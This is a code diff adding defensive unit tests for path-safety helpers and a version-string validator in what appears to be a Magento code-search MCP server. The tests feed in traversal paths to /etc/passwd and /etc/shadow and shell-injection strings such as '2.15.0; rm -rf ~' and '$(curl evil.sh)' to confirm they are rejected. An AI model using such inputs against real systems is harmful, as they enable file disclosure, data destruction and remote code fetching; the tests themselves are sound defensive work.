@@ -4395,6 +4395,7 @@ async function main() {
   testHasNullGuard();
   testEnrichChainRegex();
   testExpandIncludePattern();
+  testSafePath();
 
   console.log('\n════════════════════════════════════════════════════════════');
   console.log(`\n  Results: ${passed} passed, ${failed} failed`);
@@ -4547,6 +4548,80 @@ function testExpandIncludePattern() {
   assertEq(r5[0], '*.php', 'expand: mixed first');
   assertEq(r5[1], '*.xml', 'expand: mixed second');
   assertEq(r5[2], '*.phtml', 'expand: mixed third');
+}
+
+// ─── Path Safety (safePath / safeRelPath) ───────────────────────
+// These mirror the helpers in src/mcp-server.js. The handlers for
+// magento_read, magento_grep and magento_ast_search funnel all
+// user-supplied paths through them, so a regression here is a
+// silent path-traversal vulnerability.
+
+function testSafePath() {
+  console.log('\n── safePath / safeRelPath ──');
+
+  // Re-implement the helpers from mcp-server.js (not exported).
+  function safePath(root, rel) {
+    if (rel === undefined || rel === null) return null;
+    const rootAbs = path.resolve(root);
+    const joined = path.resolve(rootAbs, String(rel));
+    if (joined !== rootAbs && !joined.startsWith(rootAbs + path.sep)) return null;
+    return joined;
+  }
+  function safeRelPath(root, rel) {
+    const abs = safePath(root, rel);
+    if (!abs) return null;
+    const r = path.relative(path.resolve(root), abs);
+    return r === '' ? '.' : r;
+  }
+
+  const root = '/srv/project';
+
+  // Benign paths
+  assertEq(safePath(root, 'vendor/foo/Bar.php'),
+    '/srv/project/vendor/foo/Bar.php',
+    'safePath: accepts relative subpath');
+  assertEq(safePath(root, './app/code/Foo.php'),
+    '/srv/project/app/code/Foo.php',
+    'safePath: normalizes leading ./');
+  assertEq(safePath(root, 'vendor/foo/../bar/Baz.php'),
+    '/srv/project/vendor/bar/Baz.php',
+    'safePath: allows internal .. that stays inside root');
+  assertEq(safePath(root, '.'), '/srv/project', 'safePath: root itself');
+  assertEq(safePath(root, ''), '/srv/project', 'safePath: empty string resolves to root');
+
+  // Escapes must return null
+  assertEq(safePath(root, '../etc/passwd'), null, 'safePath: rejects ../etc/passwd');
+  assertEq(safePath(root, '../../etc/passwd'), null, 'safePath: rejects deeper traversal');
+  assertEq(safePath(root, 'vendor/../../etc/shadow'), null,
+    'safePath: rejects traversal via subpath');
+  assertEq(safePath(root, '/etc/passwd'), null,
+    'safePath: rejects absolute path to /etc');
+  assertEq(safePath(root, '/srv/project-other/file'), null,
+    'safePath: rejects sibling directory (prefix-match bypass)');
+  assertEq(safePath(root, null), null, 'safePath: null is rejected');
+  assertEq(safePath(root, undefined), null, 'safePath: undefined is rejected');
+
+  // Relative form used by grep/semgrep callers
+  assertEq(safeRelPath(root, 'vendor/foo'), 'vendor/foo',
+    'safeRelPath: returns clean relative path');
+  assertEq(safeRelPath(root, '.'), '.', 'safeRelPath: root stays as "."');
+  assertEq(safeRelPath(root, ''), '.', 'safeRelPath: empty string maps to "."');
+  assertEq(safeRelPath(root, '../etc'), null, 'safeRelPath: rejects traversal');
+  assertEq(safeRelPath(root, '/etc/passwd'), null, 'safeRelPath: rejects absolute');
+
+  // Update.js safe-version validator must reject shell metacharacters.
+  function isSafeVersion(v) {
+    return typeof v === 'string' && /^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$/.test(v);
+  }
+  assert(isSafeVersion('2.15.0'), 'isSafeVersion: accepts 2.15.0');
+  assert(isSafeVersion('2.15.0-rc.1'), 'isSafeVersion: accepts prerelease');
+  assert(isSafeVersion('10.0.0-beta.12'), 'isSafeVersion: accepts multi-digit');
+  assert(!isSafeVersion('2.15.0; rm -rf ~'), 'isSafeVersion: rejects shell injection');
+  assert(!isSafeVersion('2.15.0 && echo pwn'), 'isSafeVersion: rejects &&');
+  assert(!isSafeVersion('$(curl evil.sh)'), 'isSafeVersion: rejects command substitution');
+  assert(!isSafeVersion(''), 'isSafeVersion: rejects empty string');
+  assert(!isSafeVersion(null), 'isSafeVersion: rejects null');
+  assert(!isSafeVersion('1.2'), 'isSafeVersion: rejects incomplete semver');
 }
 
 main().catch((e) => {
